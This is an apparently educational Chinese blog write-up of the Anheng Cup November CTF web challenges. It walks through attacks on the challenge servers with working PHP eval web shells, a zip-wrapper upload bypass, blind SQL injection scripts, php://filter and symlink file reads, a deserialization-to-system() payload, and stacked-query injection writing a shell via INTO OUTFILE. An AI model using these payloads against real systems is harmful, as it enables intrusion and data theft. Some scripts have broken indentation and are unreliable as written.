@@ -1,0 +1,1060 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>安恒杯十一月份月赛writeup</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《安恒杯十一月份月赛writeup》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		3/21/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2019/03/21/安恒杯十一月份月赛writeup/" itemprop="url">		
+			安恒杯十一月份月赛writeup		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2019/03/21/安恒杯十一月份月赛writeup/" itemprop="url">
+	<time datetime="2019-03-21T02:08:10.475Z" itemprop="datePublished">
+  		2019-03-21
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>十一月份的安恒杯好难呀(QAQ),自己太菜了，把题目总结并且复现了一波，收获还是挺多的</p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="签到题——-手速要快"><a href="#签到题——-手速要快" class="headerlink" title="签到题—— 手速要快"></a>签到题—— 手速要快</h4><p>打开题目链接</p>
+<p>就会看到一个需要输入一个Password</p>
+<p><img src="https://i.imgur.com/Wa9ytEF.png" alt=""></p>
+<p>打开F12在header里面就会看到password</p>
+<p><img src="https://i.imgur.com/DFq1jhw.png" alt=""></p>
+<p>输入后发现是文件上传题目</p>
+<p><img src="https://i.imgur.com/OUteW6U.png" alt=""></p>
+<p>一个简单的脚本</p>
+<pre><code>&lt;?php phpinfo();
+
+?&gt;
+</code></pre><p>直接上传，更改格式，发现上传成功。</p>
+<p><img src="https://i.imgur.com/iG2qGK1.png" alt=""></p>
+<p>并且可以被解析为PHP</p>
+<p><img src="https://i.imgur.com/e4hxq20.png" alt=""></p>
+<p>于是在burp进行操作得到相应的flag</p>
+<p><img src="https://i.imgur.com/jyTrQ7w.png" alt=""></p>
+<p><img src="https://i.imgur.com/W0eVgIx.png" alt=""></p>
+<p>也可以使用菜刀进行连接</p>
+<p><img src="https://i.imgur.com/s8TS03v.png" alt=""></p>
+<h4 id="image-up"><a href="#image-up" class="headerlink" title="image_up"></a>image_up</h4><p>打开链接就会发现是一个登录页面</p>
+<p><img src="https://i.imgur.com/W2r6jlT.png" alt=""></p>
+<p>我们利用PHP伪协议中的<code>php://filter</code>可以直接读取本地文件</p>
+<p><img src="https://i.imgur.com/UxJWw6o.png" alt=""></p>
+<p>发现是base64编码的，使用在线解码工具就可以得到</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; &gt;
+
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;Login Form&lt;/title&gt;
+
+&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;
+
+  &lt;link rel=&#39;stylesheet&#39; href=&#39;https://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900&#39;&gt;
+&lt;link rel=&#39;stylesheet&#39; href=&#39;https://fonts.googleapis.com/css?family=Montserrat:400,700&#39;&gt;
+&lt;link rel=&#39;stylesheet&#39; href=&#39;https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css&#39;&gt;
+
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
+
+
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;?php
+  if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])){
+header(&quot;Location: index.php?page=upload&quot;);
+exit();
+  }
+?&gt;
+
+&lt;div class=&quot;form&quot;&gt;
+  &lt;div class=&quot;thumbnail&quot;&gt;&lt;img src=&quot;hat.svg&quot;/&gt;&lt;/div&gt;
+  &lt;form class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;username&quot;/&gt;
+&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;password&quot;/&gt;
+&lt;button type=&quot;submit&quot;&gt;login&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/div&gt;
+&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#39;&gt;&lt;/script&gt;
+
+
+
+&lt;script  src=&quot;js/index.js&quot;&gt;&lt;/script&gt;
+
+
+
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre><p>提取其中主要的部分</p>
+<pre><code>&lt;?php
+  if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])){
+header(&quot;Location: index.php?page=upload&quot;);
+exit();
+  }
+?&gt;
+</code></pre><p>使用admin 以及admin可以成功登录的</p>
+<p>使用相同的方法读取upload中的文件</p>
+<p><img src="https://i.imgur.com/H5q2Cf9.png" alt=""></p>
+<p>拿到源码</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; &gt;
+
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;Upload Form&lt;/title&gt;
+
+&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;
+
+  &lt;link rel=&#39;stylesheet&#39; href=&#39;https://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900&#39;&gt;
+&lt;link rel=&#39;stylesheet&#39; href=&#39;https://fonts.googleapis.com/css?family=Montserrat:400,700&#39;&gt;
+&lt;link rel=&#39;stylesheet&#39; href=&#39;https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css&#39;&gt;
+
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
+
+
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;?php
+$error = &quot;&quot;;
+$exts = array(&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;,&quot;jpeg&quot;);
+if(!empty($_FILES[&quot;image&quot;]))
+{
+$temp = explode(&quot;.&quot;, $_FILES[&quot;image&quot;][&quot;name&quot;]);
+$extension = end($temp);
+if((@$_upfileS[&quot;image&quot;][&quot;size&quot;] &lt; 102400))
+{
+if(in_array($extension,$exts)){
+  $path = &quot;uploads/&quot;.md5($temp[0].time()).&quot;.&quot;.$extension;
+  move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $path);
+  $error = &quot;上传成功!&quot;;
+}
+else{
+$error = &quot;上传失败！&quot;;
+}
+
+}else{
+  $error = &quot;文件过大，上传失败！&quot;;
+}
+}
+
+?&gt;
+&lt;div class=&quot;form&quot;&gt;
+  &lt;div class=&quot;thumbnail&quot;&gt;&lt;img src=&quot;hat.svg&quot;/&gt;&lt;/div&gt;
+  &lt;form class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;file&quot; name=&quot;image&quot; placeholder=&quot;image&quot;/&gt;
+&lt;button type=&quot;submit&quot;&gt;login&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;?php echo $error;?&gt;
+&lt;/div&gt;
+&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#39;&gt;&lt;/script&gt;
+
+
+
+&lt;script  src=&quot;js/index.js&quot;&gt;&lt;/script&gt;
+
+
+
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre><p>提取其中主要的部分</p>
+<pre><code>&lt;?php
+$error = &quot;&quot;;
+$exts = array(&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;,&quot;jpeg&quot;);
+if(!empty($_FILES[&quot;image&quot;]))
+{
+$temp = explode(&quot;.&quot;, $_FILES[&quot;image&quot;][&quot;name&quot;]);
+$extension = end($temp);
+if((@$_upfileS[&quot;image&quot;][&quot;size&quot;] &lt; 102400))
+{
+if(in_array($extension,$exts)){
+  $path = &quot;uploads/&quot;.md5($temp[0].time()).&quot;.&quot;.$extension;
+  move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $path);
+  $error = &quot;上传成功!&quot;;
+}
+else{
+$error = &quot;上传失败！&quot;;
+}
+
+}else{
+  $error = &quot;文件过大，上传失败！&quot;;
+}
+}
+
+?&gt;
+</code></pre><p>经过多次尝试发现使用zip协议是可以的</p>
+<p>于是创建一个shell.php的文件，内容为</p>
+<pre><code>&lt;?php @eval($_POST[&#39;p0desta&#39;]); ?&gt;
+</code></pre><p>然后压缩为shell.zip，更改后缀名：shell.jpg</p>
+<p>文件上传成功</p>
+<p>使用脚本</p>
+<pre><code>import time
+import requests
+import hashlib
+
+url = &quot;http://101.71.29.5:10007/&quot;
+def md5(str):
+    m = hashlib.md5()
+    m.update(str)
+     return m.hexdigest()
+files = {
+    &quot;image&quot;:(&quot;avatar.jpg&quot;,open(&quot;shell.jpg&quot;,&quot;rb&quot;))
+}
+t = int(time.time())
+requests.post(url=url+&quot;index.php?page=upload&quot;,files=files)
+for i in range(t-20,t+20):
+    path = &quot;uploads/&quot;+md5(&quot;avatar&quot;+str(i))+&quot;.jpg&quot;
+    status = requests.get(url=url+path).status_code
+    if status == 200:
+        print path
+        break
+</code></pre><p>得到相对应的路径</p>
+<p><img src="https://i.imgur.com/f3V9s3A.png" alt=""></p>
+<p>访问路径就会得到</p>
+<p><img src="https://i.imgur.com/K5k66vM.png" alt=""></p>
+<p>使用zip伪协议进行getshell</p>
+<p><img src="https://i.imgur.com/Wb9Dqnz.png" alt=""></p>
+<p>cat命令到flag文件下</p>
+<p><img src="https://i.imgur.com/DIa27nv.png" alt=""></p>
+<p>当然也可以像飘零大佬那样使用菜刀直接链接得到flag</p>
+<pre><code>flag{3809f2ce999b4d99c8051e285505a014}
+</code></pre><h4 id="好黑的黑名单"><a href="#好黑的黑名单" class="headerlink" title="好黑的黑名单"></a>好黑的黑名单</h4><p><strong>信息收集</strong> </p>
+<p>打开链接，一番操作之后发现F12键有一个链接</p>
+<p><img src="https://i.imgur.com/E71K9gX.png" alt=""></p>
+<p>打开相对应的链接就会发现</p>
+<p><img src="https://i.imgur.com/rXmNh0S.png" alt=""></p>
+<pre><code>http://101.71.29.5:10008/show.php?id=2
+</code></pre><p><img src="https://i.imgur.com/GDuLWFW.png" alt=""></p>
+<pre><code>http://101.71.29.5:10008/show.php?id=3
+</code></pre><p><img src="https://i.imgur.com/j54ZUAr.png" alt=""></p>
+<pre><code>http://101.71.29.5:10008/show.php?id=4
+</code></pre><p><img src="https://i.imgur.com/xS6MKhr.png" alt=""></p>
+<p><strong>试探</strong></p>
+<pre><code>if((database())like(0x25),1,2)
+</code></pre><p>发现like被过滤，于是尝试regexp</p>
+<pre><code>if((database)regexp(0x5e),1,2)
+</code></pre><p>fuzz了一下，发现可以得到数据库名为:web</p>
+<p>于是写脚本进行注入</p>
+<p><strong>尝试爆表</strong></p>
+<pre><code>select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()
+</code></pre><p>这里遇到问题，=被过滤，like也被过滤,更不用说是rlike也被过滤了，然而regexp不可以正常使用</p>
+<p><strong>构造playload</strong></p>
+<p>逻辑运算符都被过滤并且like和regexp都无法使用的情况下，就需要一个小技巧<code>betweenand</code>，用<code>betweenand</code>来代替逻辑运算符。</p>
+<p><code>betweenand</code>的基本用法百度可知。如果要应用到盲注中要注意一些细节</p>
+<p><img src="https://i.imgur.com/Eh32rvR.png" alt=""></p>
+<p><img src="https://i.imgur.com/GsOZsaM.png" alt=""></p>
+<p><img src="https://i.imgur.com/8pvAPvH.png" alt=""></p>
+<p>官方给出的解析</p>
+<p><img src="https://i.imgur.com/qvN0zWV.png" alt=""></p>
+<p><img src="https://i.imgur.com/Sybptoh.png" alt=""></p>
+<p><img src="https://i.imgur.com/WsZDjjC.png" alt=""></p>
+<p>对于被过滤的空格，我们可以使用<code>%0a</code>进行代替，并且黑名单还过滤了单引号可以使用十六进制进行替代</p>
+<p>官方给出的信息</p>
+<p><img src="https://i.imgur.com/BK6Ufw0.png" alt=""></p>
+<p>而自己可以写出代码进行替代</p>
+<pre><code># -*- coding:utf-8 -*-
+import requests
+import string
+flag = &#39;flag{&#39;
+payload=flag.encode(&#39;hex&#39;)
+list = string.digits+&#39;abcdef&#39;+&#39;}&#39;
+for i in range(1,200):
+print i
+for j in range(len(list)):
+tmp1 = payload+&#39;2f&#39;
+tmp2 = payload+list[j].encode(&#39;hex&#39;)
+url = &#39;http://101.71.29.5:10008/show.php?id=if(((select%0af1agg%0afrom%0aflaggg)between%0a0x&#39;+tmp1+&#39;%0aand%0a0x&#39;+tmp2+&#39;),1,2)&#39;
+r = requests.get(url)
+if &#39;郑州烩面的价钱为10&#39; in r.content:
+payload += list[j-1].encode(&#39;hex&#39;)
+print payload.decode(&#39;hex&#39;)
+break
+</code></pre><p>得到flag</p>
+<pre><code>flag{5d6352163c30ba51f1e2c0dd08622428}
+</code></pre><h4 id="interesting-web"><a href="#interesting-web" class="headerlink" title="interesting web"></a>interesting web</h4><p><strong>简单的测试</strong></p>
+<p>简单的一波操作，注册，登录，找回密码</p>
+<p>登录之后发现是可以上传jpg图片的</p>
+<p><img src="https://i.imgur.com/Q8kelLO.png" alt=""></p>
+<p>上传之后并且可以访问该文件</p>
+<p><img src="https://i.imgur.com/hQNVeTS.png" alt=""></p>
+<p>尝试一下可不可以读取里面的信息，发现是并不可以读取的</p>
+<p><img src="https://i.imgur.com/XnHAzJ1.png" alt=""></p>
+<p><strong>深入分析</strong></p>
+<p>还有一个找回密码没有进行尝试。解析注册页面，需要绑定个人的ip，没有外网环境绑定自己的的内网ip，能收到token即可，</p>
+<p>如果用内网建议用虚拟机收token或者关了防火墙，不然80端口访问不到</p>
+<p>启动监听</p>
+<p><img src="https://i.imgur.com/Xh1K6R9.png" alt=""></p>
+<p>收到token这里的漏洞点是把token放在session了，但是flask的session是浏览器端的，虽然不能伪造，但是能解密尝试找回admin用户密码，拿到session</p>
+<p><img src="https://i.imgur.com/vpxekzW.png" alt=""></p>
+<pre><code>eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJPR1ZrWlRaaU56RTJaVE5tTm1FeE5HRTFOalJrWkRka01qZGhOR
+Fl5WldJPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.Dio4mQ.Qrh59NWeB9aaTKLCwgU9aZwfLjA
+</code></pre><p>使用脚本解密，解密脚本放在exp文件夹下</p>
+<p><img src="https://i.imgur.com/LKWq4pW.png" alt=""></p>
+<p>成功修改admin密码，现在有了上传tar包的权限，但是不是php的后端，没办法getshell，可以利用软连接来读一些敏感文件试试</p>
+<pre><code>ln-s/etc/passwd2.jpg
+
+tarcvfpshell.tar2.jpg
+</code></pre><p><img src="https://i.imgur.com/cJHZxvA.png" alt=""></p>
+<p>成功上传解压</p>
+<pre><code>curl http://192.168.190.128:10002/download/2.jpg
+
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:curlhttp://192.168.190.128:10002/
+download.jpgroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/
+nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/
+
+nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:
+
+mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:
+proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:
+
+MailingListManager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:GnatsBug-ReportingSystem(admin):/var/lib/gnats:/usr/sbin/
+nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/
+falsemysql:x:999:999::/home/mysql:ctf:x:1000:1000::/home/ctf:/bin/bashflag{5be43c58a33a867cb11975587f8edf33}
+9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/
+nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/
+
+nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:MailingListManager:/
+
+var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:GnatsBug-
+ReportingSystem(admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/
+nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falsemysql:x:999:999::/home/mysql:ctf:x:1000:1000::/home/ctf:/bin/bash
+flag{5be43c58a33a867cb11975587f8edf33}
+</code></pre><h4 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h4><p><strong>这一题本人没有进行复现主要原因：事情太多了</strong></p>
+<p>打开页面，发现只有注册，登录功能，然后就是个人信息页面</p>
+<pre><code>http://101.71.29.5:10024/user/user.php?id=5
+</code></pre><p>随手测试了一下，发现存在sql注入</p>
+<pre><code>http://101.71.29.5:10024/user/user.php?id=if(1,1,2)
+
+
+http://101.71.29.5:10024/user/user.php?id=if(0,1,2)
+</code></pre><p>但这里的过滤很坑,首先没有引号，其次是过滤没有回显，我无法通过</p>
+<pre><code>if(length(&#39;a&#39;),1,2)
+</code></pre><p>这样的方式去识别过滤，这是我觉得比较头疼的问题</p>
+<p>后来在随便测试的时候发现</p>
+<pre><code>if(hex(database())like(0x25),1,2)
+</code></pre><p>回显正常，随即觉得应该有戏，但是由于过滤太多，依次尝试，发现可以load_file</p>
+<pre><code>if((hex(load_file(0x2f6574632f706173737764))like(0x25)),1,2)
+</code></pre><p>尝试读了一下/etc/passwd</p>
+<p>发现成功，于是想到读/var/www/html/index.php</p>
+<p>然后得到文件内容</p>
+<pre><code>&lt;?php 
+require_once(&#39;config/sys_config.php&#39;);
+require_once(&#39;header.php&#39;);
+if(isset($_COOKIE[&#39;CONFIG&#39;])){
+$config = $_COOKIE[&#39;CONFIG&#39;];
+require_once(&#39;config/config.php&#39;);
+}
+?&gt;
+</code></pre><p>然后读<code>/var/www/html/config.php</code></p>
+<p>得到文件内容</p>
+<pre><code>&lt;?php
+$config = unserialize(base64_decode($config));
+if(isset($_GET[&#39;p&#39;])){
+$p=$_GET[&#39;p&#39;];
+$config-&gt;$p;
+}
+class Config{
+private $config;
+private $path;
+public $filter;
+public function __construct($config=&quot;&quot;){
+$this-&gt;config = $config;
+echo 123;
+}
+public function getConfig(){
+if($this-&gt;config == &quot;&quot;){
+$config = isset($_POST[&#39;config&#39;])?$_POST[&#39;config&#39;]:&quot;&quot;;
+}
+}
+public function SetFilter($value){
+//echo $value;
+$value=waf_exec($value); 
+var_dump($value);
+if($this-&gt;filter){
+foreach($this-&gt;filter as $filter){
+$array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);
+}
+$this-&gt;filter = array();
+}else{
+return false;
+}
+return true;
+}
+public function __get($key){
+//var_dump($key);
+$this-&gt;SetFilter($key);
+die(&quot;&quot;);
+}
+}
+</code></pre><p>发现是一波反序列化的操作，注意到函数</p>
+<pre><code>public function __get($key){
+    //var_dump($key);
+$this-&gt;SetFilter($key);
+    die(&quot;&quot;);
+}
+</code></pre><p>以及</p>
+<pre><code>if(isset($_GET[&#39;p&#39;])){
+$p=$_GET[&#39;p&#39;];
+$config-&gt;$p;
+}
+</code></pre><p>发现可控值，跟踪SetFilter</p>
+<p>发现</p>
+<pre><code>$value=waf_exec($value); 
+    var_dump($value);
+if($this-&gt;filter){
+        foreach($this-&gt;filter as $filter){
+            $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);
+</code></pre><p>发现可进行RCE的位置，于是尝试构造</p>
+<pre><code>$sky = new Config();
+$sky-&gt;filter = array(&#39;system&#39;);
+echo base64_encode(serialize($sky));
+</code></pre><p>发现成功列目录，但是在尝试读取flag的时候出现问题</p>
+<p>首先flag2333是个目录，然后/和空格被过滤，我们列出当前文件夹下所有文件</p>
+<p>这里使用$IFS进行绕过空格</p>
+<p><img src="https://p3.ssl.qhimg.com/t010df7e65f61bc91d6.png" alt=""></p>
+<p>得到文件名，依旧无法cat，因为没有/，尝试通配符?，发现也被过滤</p>
+<p>最后想到grep，如下图</p>
+<p><img src="https://p1.ssl.qhimg.com/t014c420fc5c456c8cb.png" alt=""></p>
+<p>即可无需目录名getflag</p>
+<p><img src="https://p1.ssl.qhimg.com/t01f73478c123fd3cb9.png" alt=""></p>
+<h4 id="Write-A-Shell"><a href="#Write-A-Shell" class="headerlink" title="Write A Shell"></a>Write A Shell</h4><p>居然是多行注入…想不到想不到</p>
+<p>EXECUTE 子句<br>正好最近在学数据库原理。赶紧搞一下。</p>
+<p>实际上，SQL可以执行一些预定义的语句，需要先SET 一个变量，之后PREPARE 来准备语句，利用 EXECUTE 执行。</p>
+<pre><code>mysql&gt; SET @A=&quot;SELECT database()&quot;;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; PREPARE st FROM  @A;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+mysql&gt; EXECUTE st;
++------------+
+| database() |
++------------+
+| WEB|
++------------+
+</code></pre><p>当然，可以用准备过的sql语句，如下所示。</p>
+<pre><code>mysql&gt; SET @a = &quot;SELECT 1,?,? as shaobao&quot;;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; PREPARE st FROM @a;
+
+mysql&gt; SET @a=10;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; SET @b=11;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; EXECUTE st USING @a,@b;
++---+----+---------+
+| 1 | ?  | shaobao |
++---+----+---------+
+| 1 | 10 | 11  |
++---+----+---------+
+1 row in set (0.00 sec)
+</code></pre><p><strong>多行注入脱裤</strong></p>
+<p>发现加个分号正常执行，这就是一个很典型的多行注入了。当初没有向这个方向去思考。</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/n2txidyaz08cwn8cam5fp1sp/TIM%E6%88%AA%E5%9B%BE20181128002155.png" alt=""></p>
+<p>之后，就是绕过各种waf了，首先单引号之类的全部被加了 slash。但是可以用concat(char()..)的形式绕过。</p>
+<p>此外各种关键词被替换成了 @@ 所幸的是 SELECT EXEC AS 子句还是可以使用的。</p>
+<p>最后是一些逻辑运算符号，比如^&amp;*%$被换成了@，但是可以利用这个特性去构造变量符号@</p>
+<pre><code>import requests 
+
+Query0 = &quot;SET ^a=&quot;
+Query1_raw = &quot;SELECT 1,2,3,4,5&quot;
+Query1_pass_waf = &quot;concat({})&quot;
+Query2 = &quot;;PREPARE st from ^a;EXECUTE st;&quot;
+
+tmp_str = &quot;&quot;
+for i in Query1_raw:
+tmp_str+=&quot;CHAR({}),&quot;.format(ord(i))
+
+print(Query0+Query1_pass_waf.format(tmp_str[0:-1])+Query2)
+</code></pre><p>想要注入的轻松，脚本就要这么写。我们发现 select 1,2,3,4,5能够成功执行</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/rioss3jyoqep5jkp0iifpv6a/TIM%E6%88%AA%E5%9B%BE20181128093144.png" alt=""></p>
+<p><strong>Web Shell</strong></p>
+<p>之后就是各种查询了，题目提示是写shell，那么就要有写权限。</p>
+<p>查询当前用户的权限。可以打开pma看一眼</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/iqbe0sjhm5x7b07p5r2dg20e/TIM%E6%88%AA%E5%9B%BE20181128093727.png" alt=""></p>
+<p>好的，目标很明确，语句应该如下所示：</p>
+<pre><code>SELECT GRANTEE,PRIVILEGE_TYPE,3,4,IS_GRANTABLE FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE=&#39;FILE&#39;
++--------------------+----------------+---+---+--------------+
+| GRANTEE| PRIVILEGE_TYPE | 3 | 4 | IS_GRANTABLE |
++--------------------+----------------+---+---+--------------+
+| &#39;root&#39;@&#39;localhost&#39; | FILE   | 3 | 4 | YES  |
++--------------------+----------------+---+---+--------------+
+
+user_id:&#39;ctf666&#39;@&#39;localhost&#39;
+
+user_name:FILE
+
+注册时间：NO
+</code></pre><p>之后查询文件写的路径</p>
+<pre><code>mysql&gt; show variables like &quot;%secure_file_priv%&quot;;
++------------------+----------------+
+| Variable_name| Value  |
++------------------+----------------+
+| secure_file_priv | c:\wamp64\tmp\ |
++------------------+----------------+
+
+user_id:secure_file_priv
+
+user_name:/var/www/
+
+注册时间：
+</code></pre><p>最后写文件，我们发现头像目录是可写的，最终结果如下</p>
+<p><img src="http://static.zybuluo.com/shaobaobaoer/o6eaxh6qhnpk5yu5krf94p3b/TIM%E6%88%AA%E5%9B%BE20181128100153.png" alt=""></p>
+<p>完整脚本如下：</p>
+<pre><code>import requests 
+
+Query0 = &quot;SET ^a=&quot;
+# Query1_raw = &quot;SELECT GRANTEE,PRIVILEGE_TYPE,3,4,IS_GRANTABLE FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE=&#39;FILE&#39;&quot;
+# Query1_raw = &quot;show variables like &#39;%secure_file_priv%&#39;&quot;
+Query1_raw = &quot;SELECT &#39;&lt;?php eval($_POST[&#39;h&#39;]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/shaobao.php&#39;&quot;
+Query1_pass_waf = &quot;concat({})&quot;
+Query2 = &quot;;PREPARE st from ^a;EXECUTE st;&quot;
+
+tmp_str = &quot;&quot;
+for i in Query1_raw:
+tmp_str+=&quot;CHAR({}),&quot;.format(ord(i))
+
+print(Query0+Query1_pass_waf.format(tmp_str[0:-1])+Query2)
